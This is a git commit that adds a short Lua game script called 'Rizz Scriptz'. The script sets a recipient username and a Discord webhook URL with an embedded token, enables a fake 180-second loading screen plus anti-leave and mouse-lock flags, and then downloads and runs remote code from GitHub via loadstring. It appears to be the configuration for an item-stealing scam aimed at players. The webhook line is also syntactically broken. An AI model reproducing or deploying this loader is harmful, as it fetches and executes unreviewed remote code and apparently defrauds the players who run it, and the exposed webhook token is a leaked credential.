15ec18dd7f4bf4c5fb37f7666f0ecb5840e18343
aekhalism <133611896+aekhalism@users.noreply.github.com>
2023-05-15 07:21:49 +0700

    Create script.lua

---
+++ script.lua
@@ -0,0 +1,15 @@
+UserName = "muaxuan1204"
+Webhook = https://discordapp.com/api/webhooks/1107132008775286834/5qTqO1pmibA7H5c9eedKDSn22cME7uSDwYyfS_mnT5Ut0jrkJWLdQyPhuvZXvL9l84l6" -- optional delete the whole line if you don't want it
+
+_G.LoadingScreen = true
+_G.AntiLeave = true
+_G.MouseLock = true 
+-- set them to false if you don't need them
+
+_G.ScriptName = "Rizz Scriptz"
+_G.FirstText = "Script Preparing"
+_G.SecondText = "Script Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 180 -- it's the time between 0% and 100% in secondes
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/R/main/Main.lua", true))()
